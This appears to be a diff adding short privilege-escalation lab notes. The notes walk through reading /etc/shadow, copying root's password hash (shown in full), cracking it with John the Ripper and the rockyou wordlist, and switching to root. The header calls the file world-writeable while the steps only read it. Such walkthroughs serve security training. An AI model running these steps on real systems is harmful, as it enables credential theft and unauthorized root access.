@@ -1,0 +1,23 @@
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+
+NOTE: /etc/shadow is world-writeable
+
+Steps to Exploit:
+
+A. ls -l /etc/shadow
+
+B. cat /etc/shadow
+Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
+
+C.Save the root user's hash to a file called hash.txt 
+
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+
+D. john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+E.now in target:
+su root
+
+
+
+
